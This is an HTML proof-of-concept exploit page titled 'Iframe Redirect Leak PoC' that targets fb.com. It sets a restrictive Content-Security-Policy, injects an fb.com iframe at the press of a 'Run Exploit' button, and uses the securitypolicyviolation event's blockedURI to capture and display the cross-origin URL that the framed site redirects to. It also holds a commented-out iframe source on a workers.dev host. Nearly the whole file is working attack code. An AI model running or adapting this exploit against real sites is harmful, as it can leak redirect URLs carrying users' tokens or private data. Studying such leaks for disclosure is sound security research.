<!DOCTYPE html>
<html>

<head>
    <meta charset="UTF-8">
    <meta http-equiv="Content-Security-Policy"
        content="default-src 'self' 'unsafe-inline'; frame-src https://fb.com;">
    <title>Iframe Redirect Leak PoC</title>
</head>

<body>

    <h3>target: https://fb.com/</h3>
    <button id="exploitBtn">Run Exploit</button>
    <p id="status" style="word-break: break-all;">Status: Waiting...</p>
    <div id="frameContainer"></div>

    <script>
        const statusDiv = document.getElementById('status');
        document.addEventListener('securitypolicyviolation', (e) => {
            statusDiv.innerHTML = `<br><b style="color:red; font-size:18px;">
            LEAKED URI:<br>${e.blockedURI}
        </b>`;
            console.log("FULL EVENT OBJECT:", e);
        });

        document.getElementById('exploitBtn').addEventListener('click', () => {
            statusDiv.innerHTML = "Injecting iframe...";
            const iframe = document.createElement('iframe');
           // iframe.src = "https://summer-waterfall-d973.utaa1009.workers.dev/";
            iframe.src = "https://fb.com"
            iframe.style.width = "100%";
            iframe.style.height = "100px";
            iframe.style.border = "1px solid black";
            document.getElementById('frameContainer').appendChild(iframe);
        });
    </script>

</body>

</html>
